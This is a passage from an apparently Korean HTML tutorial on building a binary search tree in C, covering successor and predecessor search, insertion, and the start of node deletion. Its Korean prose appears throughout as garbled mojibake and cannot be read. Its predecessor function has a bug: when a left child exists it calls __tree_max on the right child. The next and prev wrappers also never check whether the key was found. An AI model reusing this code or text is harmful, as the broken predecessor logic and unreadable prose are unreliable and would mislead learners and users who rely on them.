ë³µì¡ë„ê°€ íŠ¸ë¦¬ì˜ ë†’ì´ì— ë¹„ë¡€í•˜ë¯€ë¡œ, ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ëŠ” ì—°ì‚°ì˜ ì‹œê°„ ë³µì¡ë„ëŠ” <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì…ë‹ˆë‹¤.</p><p>ë…¸ë“œë¥¼ ê¸°ì¤€ìœ¼ë¡œ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ëŠ” ë‚´ì¥ í•¨ìˆ˜ <code>__tree_successor</code> ëŠ” ë‘ ê²½ìš°ë¥¼ êµ¬ë¶„í•˜ê¸° ìœ„í•œ ë¶„ê¸°ë¬¸ì´ ì¡´ì¬í•©ë‹ˆë‹¤. 4í–‰ì€ ì˜¤ë¥¸ìª½ ìì‹ì´ ì¡´ì¬í•˜ëŠ” ê²½ìš°ë¡œ, <code>__tree_min</code> í•¨ìˆ˜ë¥¼ ì´ìš©í•´ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì—ì„œ í‚¤ê°€ ìµœì†Ÿê°’ì¸ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤. 7í–‰ì€ ì˜¤ë¥¸ìª½ ìì‹ì´ ì—†ëŠ” ê²½ìš°ë¡œ, ì´ ë•ŒëŠ” ë‘ ë…¸ë“œì˜ ê´€ê³„ë¥¼ ë¹„êµí•˜ê¸° ìœ„í•´ ê¸°ì¤€ ë…¸ë“œ <code>x</code> ì˜ ë¶€ëª¨ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>y</code> ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. <code>x</code> ëŠ” ë¶€ëª¨ ë…¸ë“œë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„°ë¥¼ ê³„ì† ë”°ë¼ê°€ë©´ì„œ, <code>y</code> ê°€ <code>x</code> ì˜ ë¶€ëª¨ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ê³„ì† ê°±ì‹ í•©ë‹ˆë‹¤. ì²˜ìŒìœ¼ë¡œ <code>x</code> ê°€ <code>y</code> ì˜ ì™¼ìª½ ìì‹ì´ ë˜ëŠ” ìˆœê°„, <code>y</code> ë¥¼ ë°˜í™˜í•©ë‹ˆë‹¤.</p><p>ì£¼ì–´ì§„ í‚¤ì— ëŒ€í•œ ë‹¤ìŒ ë…¸ë“œë¥¼ ë°˜í™˜í•˜ëŠ” ì—°ì‚°ì— í•´ë‹¹í•˜ëŠ” <code>next</code> í•¨ìˆ˜ëŠ” ì•ì„œ êµ¬í˜„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_search</code> ë¥¼ ì´ìš©í•´ ì£¼ì–´ì§„ í‚¤ë¥¼ ê°€ì§„ ë…¸ë“œë¥¼ ì°¾ìŠµë‹ˆë‹¤. ì´í›„ í•´ë‹¹ ë…¸ë“œì— ëŒ€í•´ ë‚´ì¥ í•¨ìˆ˜ <code>__tree_successor</code> ë¥¼ í˜¸ì¶œí•˜ì—¬ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ì•„ ë°˜í™˜í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line">Node *__tree_successor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;right != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_min(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;right) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">next</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_successor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì´ì „ ìˆœì„œë¥¼ ì°¾ì„ ë•Œë„ íŠ¸ë¦¬ì˜ í˜•íƒœì— ë”°ë¼ ë‘ ê°€ì§€ ê²½ìš°ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. ë‹¤ìŒ ìˆœì„œë¥¼ ì°¾ì„ ë•Œì™€ ë˜‘ê°™ì´ ì²˜ë¦¬í•˜ë©´ ë©ë‹ˆë‹¤. ì™¼ìª½ ìì‹ì´ ìˆëŠ” ê²½ìš°ëŠ” ì™¼ìª½ íŠ¸ë¦¬ì—ì„œ ìµœëŒ“ê°’ì„ ë°˜í™˜í•©ë‹ˆë‹¤. ì™¼ìª½ ìì‹ì´ ì—†ëŠ” ê²½ìš°, ì¡°ìƒ ë…¸ë“œë“¤ì„ ì¡°íšŒí•˜ë©´ì„œ ê¸°ì¤€ ë…¸ë“œë¥¼ ì˜¤ë¥¸ìª½ íŠ¸ë¦¬ì˜ ë…¸ë“œë¡œ ê°–ëŠ” ì²« ë²ˆì§¸ ì¡°ìƒì„ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/5.png" alt="5.png"></p><p>ì´ì „ ë…¸ë“œë¥¼ ì°¾ëŠ” ë‚´ì¥ í•¨ìˆ˜ <code>__tree_predecessor</code> ì™€, ì£¼ì–´ì§„ í‚¤ì— ëŒ€í•œ ì´ì „ ë…¸ë“œë¥¼ ì°¾ëŠ” í•¨ìˆ˜ <code>prev</code> ëŠ” ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ëŠ” ì½”ë“œì™€ ë˜‘ê°™ì€ ì›ë¦¬ë¡œ êµ¬í˜„í•˜ë©´ ë©ë‹ˆë‹¤. ë‹¨, ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ê°€ <code>__tree_min</code> ì—ì„œ <code>__tree_max</code> ë¡œ ë°”ë€ŒëŠ” ë“± ë°©í–¥ë§Œ ë°”ê¿”ì¤ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ë‚´ì¥ í•¨ìˆ˜</span></span><br><span class="line">Node *__tree_predecessor(Node *x) &#123;</span><br><span class="line">Node *y = x-&gt;parent;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (x-&gt;left != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> __tree_max(x-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (y != <span class="literal">NULL</span> &amp;&amp; x == y-&gt;left) &#123;</span><br><span class="line">x = y;</span><br><span class="line">y = y-&gt;parent;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Node *<span class="title function_">prev</span><span class="params">(BST *bst, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">Node *x = __tree_search(bst-&gt;root, key);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> __tree_predecessor(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90-%EB%85%B8%EB%93%9C-%EC%82%BD%EC%9E%85%ED%95%98%EA%B8%B0" tabindex="-1">íŠ¸ë¦¬ì— ë…¸ë“œ ì‚½ì…í•˜ê¸°</h3><p>ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì— ì¶”ê°€í•˜ëŠ” ì—°ì‚°ì€ ì‚½ì… ì—°ì‚°ì…ë‹ˆë‹¤. ì‚½ì… ì—°ì‚°ì€ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ í•­ìƒ ë¦¬í”„ ë…¸ë“œë¡œ ì¶”ê°€í•˜ë©´ ì‰½ê²Œ êµ¬í˜„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì€ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì— ìƒˆë¡œìš´ í‚¤ <code>7</code> ì„ ê°€ì§„ ë…¸ë“œë¥¼ ì‚½ì…í•˜ëŠ” ê³¼ì •ì„ ë‚˜íƒ€ë‚´ê³  ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/6.png" alt="6.png"></p><p>ë…¸ë“œë¥¼ ì‚½ì…í•˜ê¸° ìœ„í•´ì„œëŠ”, ì´ì§„ íƒìƒ‰ì„ í†µí•´ ì‚½ì…í•  ë…¸ë“œë¥¼ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ë…¸ë“œë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. ì‚½ì…í•  ë…¸ë“œë¥¼ ì™¼ìª½ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ë…¸ë“œë¼ë©´ ê¸°ì¡´ì— ì™¼ìª½ ìì‹ì´ ì—†ì–´ì•¼ í•˜ê³ , ì˜¤ë¥¸ìª½ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ë…¸ë“œë¼ë©´ ì˜¤ë¥¸ìª½ ìì‹ì´ ì—†ì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ë¦¼ì—ì„œëŠ” ì´ì§„ íƒìƒ‰ì„ í†µí•´ í‚¤ <code>7</code> ì˜ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì‚½ì…í•  ë…¸ë“œë¥¼ ì°¾ìŠµë‹ˆë‹¤. í‚¤ <code>8</code> ì„ ê°€ì§„ ë…¸ë“œê°€ ì™¼ìª½ ìì‹ì´ ì—†ìœ¼ë©´ì„œ, <code>7</code> ì€ <code>8</code> ë³´ë‹¤ ì‘ìœ¼ë‹ˆ í•´ë‹¹ ë…¸ë“œì˜ ì™¼ìª½ ìì‹ìœ¼ë¡œ ì‚½ì…í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ì‚½ì… ì—°ì‚°ì˜ ì‹œê°„ ë³µì¡ë„ ë˜í•œ íŠ¸ë¦¬ì˜ ë†’ì´ì— ë¹„ë¡€í•˜ë¯€ë¡œ, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>â¡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>ì…ë‹ˆë‹¤.</p><p>ì‚½ì… ì—°ì‚°ì„ êµ¬í˜„í•œ <code>insert</code> í•¨ìˆ˜ëŠ” í‚¤ì™€ ê°’ì„ ì¸ìë¡œ ë°›ê³ , <code>malloc</code> í•¨ìˆ˜ë¥¼ í†µí•´ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì´í›„ 6í–‰ì—ì„œ ë£¨íŠ¸ ë…¸ë“œì—ì„œ ì‹œì‘í•˜ëŠ” í¬ì¸í„° <code>x</code> ì™€, <code>x</code> ì˜ ë¶€ëª¨ë¥¼ ê°€ë¦¬í‚¤ëŠ” í¬ì¸í„° <code>y</code> ë¥¼ ì´ìš©í•˜ì—¬ ì´ì§„ íƒìƒ‰ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ë°˜ë³µë¬¸ì˜ ì¢…ë£Œ ì¡°ê±´ì€ <code>y</code> ì˜ ìì‹ <code>x</code> ê°€ <code>NULL</code> ì´ ë˜ëŠ” ê²ƒìœ¼ë¡œ, ì´ë•Œì˜ <code>x</code> ì˜ ìœ„ì¹˜ê°€ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ì‚½ì…í•´ì•¼ í•  ìœ„ì¹˜ì…ë‹ˆë‹¤. 12í–‰ì—ì„œëŠ” ì£¼ì–´ì§„ í‚¤ ê°’ê³¼ <code>y</code> ì˜ í‚¤ ê°’ì„ ë¹„êµí•˜ì—¬, ì™¼ìª½ ìì‹ìœ¼ë¡œ ì‚½ì…í• ì§€ ì˜¤ë¥¸ìª½ ìì‹ìœ¼ë¡œ ì‚½ì…í• ì§€ ê²°ì •í•©ë‹ˆë‹¤. ë§Œì•½ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ê°€ ë¹„ì–´ ìˆì—ˆë‹¤ë©´ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ë£¨íŠ¸ ë…¸ë“œë¡œ ì„¤ì •í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">insert</span><span class="params">(BST* bst, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">Node *newnode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">Node *x = bst-&gt;root, *y = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">*newnode = (Node) &#123; key, value, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (x != <span class="literal">NULL</span>) &#123;</span><br><span class="line">y = x;</span><br><span class="line">x = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;</span><br><span class="line">&#125;</span><br><span class="line">newnode-&gt;parent = y;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (y == <span class="literal">NULL</span>) &#123;<span class="comment">// ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ê°€ ë¹„ì–´ ìˆëŠ” ê²½ìš°</span></span><br><span class="line">bst-&gt;root = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (newnode-&gt;key &lt; y-&gt;key) &#123;</span><br><span class="line">y-&gt;left = newnode;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">y-&gt;right = newnode;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="%ED%8A%B8%EB%A6%AC%EC%97%90%EC%84%9C-%EB%85%B8%EB%93%9C-%EC%82%AD%EC%A0%9C%ED%95%98%EA%B8%B0" tabindex="-1">íŠ¸ë¦¬ì—ì„œ ë…¸ë“œ ì‚­ì œí•˜ê¸°</h3><p>íŠ¸ë¦¬ì—ì„œ ë…¸ë“œë¥¼ ì‚­ì œí•˜ëŠ” ì—°ì‚°ì€ êµ¬í˜„ ì¤‘ ë‹¤ì†Œ ê¹Œë‹¤ë¡œìš´ ë¶€ë¶„ì…ë‹ˆë‹¤. í•­ìƒ ìƒˆë¡œìš´ ë…¸ë“œë¥¼ ë¦¬í”„ ë…¸ë“œë¡œ ì¶”ê°€í•˜ëŠ” ì‚½ì… ì—°ì‚°ê³¼ ë‹¬ë¦¬, ë…¸ë“œë¥¼ ì¤‘ê°„ì—ì„œ ì‚­ì œí•˜ê²Œ ë˜ë©´ íŠ¸ë¦¬ì˜ í˜•íƒœê°€ ë³€í˜•ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë…¸ë“œë¥¼ ì‚­ì œí•  ë•ŒëŠ” ì‚­ì œí•  ë…¸ë“œê°€ ê°€ì§„ ìì‹ì˜ ê°œìˆ˜ì— ë”°ë¼ ê²½ìš°ê°€ ë‚˜ëˆ„ì–´ì§‘ë‹ˆë‹¤. ì•„ë˜ ê·¸ë¦¼ì€ íŠ¸ë¦¬ì—ì„œ í‚¤ <code>3</code> ì„ ê°€ì§„ ë…¸ë“œë¥¼ ì‚­ì œí•˜ëŠ” ëª¨ìŠµìœ¼ë¡œ, ì‚­ì œí•  ë…¸ë“œê°€ ìì‹ì´ ì•„ì˜ˆ ì—†ê±°ë‚˜ í•˜ë‚˜ì¸ ê²½ìš°ì…ë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/7.png" alt="7.png"></p><p>ê·¸ë¦¼ì˜ ê²½ìš°ëŠ” ë¹„êµì  ë‹¨ìˆœí•œ ê²½ìš°ë¡œ, ìì‹ì´ ì—†ëŠ” ê²½ìš°ëŠ” ë‹¨ìˆœíˆ ì‚­ì œí•˜ë©´ ë©ë‹ˆë‹¤. ìì‹ì´ í•˜ë‚˜ ìˆëŠ” ê²½ìš°ëŠ” í•´ë‹¹ ìì‹ ë…¸ë“œë¥¼ ì‚­ì œí•  ë…¸ë“œ ìœ„ì¹˜ì— ëŒ€ì…í•˜ë©´, ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì„ ìœ ì§€í•˜ë©´ì„œ ì‚­ì œë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‚¬ì‹¤ ì´ ë‘˜ì€ êµ¬í˜„ ìƒìœ¼ë¡œëŠ” ë™ì¼í•œ ê²½ìš°ì…ë‹ˆë‹¤. ìì‹ì´ ì—†ëŠ” ê²½ìš°ë„ <code>NULL</code> ìì‹ ë…¸ë“œê°€ ìˆì–´ ì‚­ì œí•  ìœ„ì¹˜ì— <code>NULL</code> ì„ ëŒ€ì…í•œë‹¤ê³  ìƒê°í•˜ë©´ ìì‹ì´ í•˜ë‚˜ì¸ ê²½ìš°ì™€ ê°™ì€ ì½”ë“œë¡œ ì²˜ë¦¬í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.</p><p>ë°˜ë©´ ìì‹ì´ ë‘ ê°œ ìˆëŠ” ê²½ìš°ëŠ” ì¡°ê¸ˆ ë³µì¡í•©ë‹ˆë‹¤. ì´ ë•ŒëŠ” íŠ¸ë¦¬ì—ì„œ ìˆœì„œ ìƒ ë‹¤ìŒ ë…¸ë“œë¥¼ ì°¾ì€ í›„, ë‹¤ìŒ ë…¸ë“œê°€ ì‚­ì œí•  ë…¸ë“œì˜ ì˜¤ë¥¸ìª½ ìì‹ì¸ì§€ ì•„ë‹Œì§€ì— ë”°ë¼ ê²½ìš°ê°€ ë‚˜ë‰˜ê²Œ ë©ë‹ˆë‹¤. ë¨¼ì € ë‹¤ìŒ ë…¸ë“œê°€ ì˜¤ë¥¸ìª½ ìì‹ì¸ ê²½ìš°ëŠ” ë‹¤ìŒ ë…¸ë“œë¥¼ ì‚­ì œí•  ë…¸ë“œ ìœ„ì¹˜ì— ëŒ€ì…í•©ë‹ˆë‹¤. ì´ ë•Œ ì´ì§„ íƒìƒ‰ íŠ¸ë¦¬ì˜ ì„±ì§ˆì— ì˜í•´ ë‹¤ìŒ ë…¸ë“œëŠ” ì™¼ìª½ ìì‹ì´ ì—†ìŠµë‹ˆë‹¤. ë§Œì•½ ì™¼ìª½ ìì‹ì´ ìˆìœ¼ë©´ ê·¸ìª½ì´ ë‹¤ìŒ ë…¸ë“œê°€ ë˜ì–´ ëª¨ìˆœì´ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì‚­ì œí•  ë…¸ë“œ ìœ„ì¹˜ì— ëŒ€ì…í•˜ì—¬ë„, ì‚­ì œí•  ë…¸ë“œì˜ ì™¼ìª½ ìì‹ì„ ê·¸ëŒ€ë¡œ ì™¼ìª½ ìì‹ìœ¼ë¡œ ê°€ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/8.png" alt="8.png"></p><p>ë‹¤ìŒ ë…¸ë“œê°€ ì‚­ì œí•  ë…¸ë“œì˜ ì˜¤ë¥¸ìª½ ìì‹ì´ ì•„ë‹ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ì´ ë•Œ ì‚­ì œí•  ë…¸ë“œë¥¼ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>, ì‚­ì œí•  ë…¸ë“œì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>, ì‚­ì œí•  ë…¸ë“œì˜ ë‹¤ìŒ ë…¸ë“œë¥¼ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> ë¼ê³  í•˜ê² ìŠµë‹ˆë‹¤. ì´ ê²½ìš°ì—ëŠ” íŠ¸ë¦¬ë¥¼ ë‘ ë²ˆ ì›€ì§ì—¬ ì£¼ì–´ì•¼ í•©ë‹ˆë‹¤. ë¨¼ì € ë‹¤ìŒ ë…¸ë“œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>ì˜ ì˜¤ë¥¸ìª½ ìì‹ì„ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq> ìœ„ì¹˜ì— ëŒ€ì…í•©ë‹ˆë‹¤. ì´í›„ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>ë¥¼ ì‚­ì œí•  ë…¸ë“œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq> ìœ„ì¹˜ì— ëŒ€ì…í•œ í›„, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span></eq>ì˜ ì˜¤ë¥¸ìª½ ìì‹ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></eq>ê³¼ ì—°ê²°í•´ì¤ë‹ˆë‹¤. ì•ì„œ ë§í–ˆë“¯ ë‹¤ìŒ ë…¸ë“œ <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></eq>ëŠ” ì™¼ìª½ ìì‹ì´ ì—†ì–´, ë‘ ì‘ì—… ëª¨ë‘ ì „í˜€ ë¬¸ì œê°€ ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><p><img src="/images/binary-search-tree/9.png" alt="9.png"></p><p>ì‚­ì œ ì—°ì‚°ì€ ëª¨ë“  ê²½ìš°ì—ì„œ ë…¸ë“œë¥¼ ë‹¤ë¥¸ ë…¸ë“œì˜ ìœ„ì¹˜ì— ëŒ€ì…í•˜ëŠ” ì‘ì—…ì´ í•„ìš”í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ë¨¼ì € ëŒ€ì…ì„ ìœ„í•œ ë‚´ì¥ í•¨ìˆ˜ <code>__transplant</code> ë¥¼ êµ¬í˜„í•˜ê² ìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ëŠ” ë…¸ë“œ <code>v</code> ë¥¼ ë…¸ë“œ <code>u</code> ìœ„ì¹˜ì— ëŒ€ì…í•œ í›„, ê¸°ì¡´ ë…¸ë“œ <code>u</code> ì˜ ë¶€ëª¨ê°€ ìƒˆë¡œìš´ ë…¸ë“œ <code>v</code> ë¥¼ ìì‹ìœ¼ë¡œ ê°–ë„ë¡ í•©ë‹ˆë‹¤. ë‹¤ë§Œ ìƒˆë¡œìš´ ë…¸ë“œ <code>v</code> ì˜ ìì‹ í¬ì¸í„°ë“¤ì„ ì—°ê²°í•˜ëŠ” ì‘ì—…ì€ í•˜ì§€ ì•Šì•„, í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ìª½ì—ì„œ ì§ì ‘ í•´ì•¼ í•©ë‹ˆë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __transplant(BST *bst, Node *u, Node *v) &#123;</span><br><span class="line"><span class="keyword">if</span> (u-&gt;parent == <span class="literal">NULL</span>) &#123;<span class="comment">// uê°€ ë£¨íŠ¸ ë…¸ë“œì¸ ê²½ìš°</span></span><br><span class="line">bst-&gt;root = v;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (u == u-&gt;parent-&gt;left) &#123;<span class="comment">// uê°€ ì™¼ìª½ ìì‹ì´ì—ˆë‹¤ë©´</span></span><br><span class="line">u-&gt;parent-&gt;left = v;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// uê°€ ì˜¤ë¥¸ìª½ ìì‹ì´ì—ˆë‹¤ë©´</span></span><br><span class="line">u-&gt;parent-&gt;right = v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (v != <span class="literal">NULL</span>) &#123;</span><br><span class="line">v-&gt;parent = 